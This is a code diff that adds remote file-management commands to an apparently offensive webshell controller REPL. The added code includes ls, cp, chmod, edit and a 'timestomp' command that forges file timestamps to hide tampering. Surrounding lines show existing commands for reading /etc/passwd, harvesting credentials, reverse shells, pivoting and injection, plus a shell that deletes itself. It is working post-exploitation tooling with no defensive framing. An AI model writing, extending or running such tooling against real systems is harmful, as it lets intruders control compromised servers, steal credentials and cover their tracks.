@@ -14,6 +14,7 @@ import shlex
 import subprocess
 import time
 from concurrent.futures import ThreadPoolExecutor
+from datetime import datetime
 from pathlib import Path
 
 import cmd2
@@ -156,6 +157,86 @@ class Repl(cmd2.Cmd):
         """read <path> — read a remote file (default /etc/passwd)."""
         path = str(line).strip() or self._ask("File path", "/etc/passwd")
         self._each(lambda ws: files.read_file(ws, path), "read")
+
+    def do_ls(self, line: cmd2.Statement) -> None:
+        """ls [path] — list a remote directory (mode/size/mtime/name)."""
+        path = str(line).strip() or self.cwd or "."
+        for ws in self.webshells:
+            log.info(f"[ls] {ws}: {path}")
+            try:
+                rows = [
+                    [f"{e['type']}{e['mode']}", e["size"],
+                     datetime.fromtimestamp(e["mtime"]).strftime("%Y-%m-%d %H:%M"), e["name"]]
+                    for e in files.list_dir(ws, path)
+                ]
+            except WebshellError as exc:
+                log.error(f"ls failed: {exc}")
+                continue
+            log.table(["mode", "size", "mtime", "name"], rows)
+
+    def do_mv(self, line: cmd2.Statement) -> None:
+        """mv <src> <dst> — move/rename a remote file."""
+        self._two_arg(line, files.move, "mv")
+
+    def do_cp(self, line: cmd2.Statement) -> None:
+        """cp <src> <dst> — copy a remote file."""
+        self._two_arg(line, files.copy_file, "cp")
+
+    def do_mkdir(self, line: cmd2.Statement) -> None:
+        """mkdir <path> — create a remote directory (recursive)."""
+        path = str(line).strip()
+        if path:
+            self._each(lambda ws: log.success(f"mkdir: {files.make_dir(ws, path)}"), "mkdir")
+
+    def do_chmod(self, line: cmd2.Statement) -> None:
+        """chmod <mode> <path> — chmod a remote file (octal, e.g. 755)."""
+        parts = str(line).split()
+        if len(parts) != 2:
+            log.error("usage: chmod <mode> <path>")
+            return
+        mode, path = parts
+        self._each(lambda ws: log.success(f"chmod: {files.chmod_path(ws, path, mode)}"), "chmod")
+
+    def do_timestomp(self, line: cmd2.Statement) -> None:
+        """timestomp <path> <reference> — copy reference's timestamps onto path."""
+        parts = str(line).split()
+        if len(parts) != 2:
+            log.error("usage: timestomp <path> <reference>")
+            return
+        path, reference = parts
+        self._each(lambda ws: files.timestomp(ws, path, reference), "timestomp")
+
+    def do_edit(self, line: cmd2.Statement | str) -> None:
+        """edit <path> — download, open in $EDITOR, upload back."""
+        import os
+        import tempfile
+
+        path = str(line).strip()
+        if not path:
+            log.error("usage: edit <remote-path>")
+            return
+        ws = self.webshells[0]
+        try:
+            data = files.read_bytes(ws, path)
+        except WebshellError as exc:
+            log.error(f"edit: cannot read {path}: {exc}")
+            return
+        with tempfile.NamedTemporaryFile(suffix=f"-{Path(path).name}", delete=False) as handle:
+            handle.write(data)
+            tmp = handle.name
+        try:
+            subprocess.run([os.environ.get("EDITOR", "vi"), tmp])  # noqa: S603
+            files.upload(ws, tmp, path)
+        finally:
+            os.unlink(tmp)
+
+    def _two_arg(self, line: cmd2.Statement, fn, label: str) -> None:
+        parts = str(line).split()
+        if len(parts) != 2:
+            log.error(f"usage: {label} <src> <dst>")
+            return
+        src, dst = parts
+        self._each(lambda ws: log.success(f"{label}: {fn(ws, src, dst)}"), label)
 
     def do_rm(self, line: cmd2.Statement) -> None:
         """rm [path] — delete a remote file; with no path the shell deletes itself."""
@@ -422,7 +503,11 @@ with contextlib.suppress(Exception):
          Repl.do_fwpf, Repl.do_gdf, Repl.do_fsb, Repl.do_enum, Repl.do_creds],
         "Recon",
     )
-    cmd2.categorize([Repl.do_r, Repl.do_rm, Repl.do_dl, Repl.do_dla, Repl.do_ul], "Files")
+    cmd2.categorize(
+        [Repl.do_r, Repl.do_rm, Repl.do_dl, Repl.do_dla, Repl.do_ul, Repl.do_ls,
+         Repl.do_mv, Repl.do_cp, Repl.do_mkdir, Repl.do_chmod, Repl.do_timestomp, Repl.do_edit],
+        "Files",
+    )
     cmd2.categorize([Repl.do_ps, Repl.do_rsh, Repl.do_db], "Pivot")
     cmd2.categorize([Repl.do_aiw, Repl.do_aimw, Repl.do_fr], "Inject")
     cmd2.categorize(
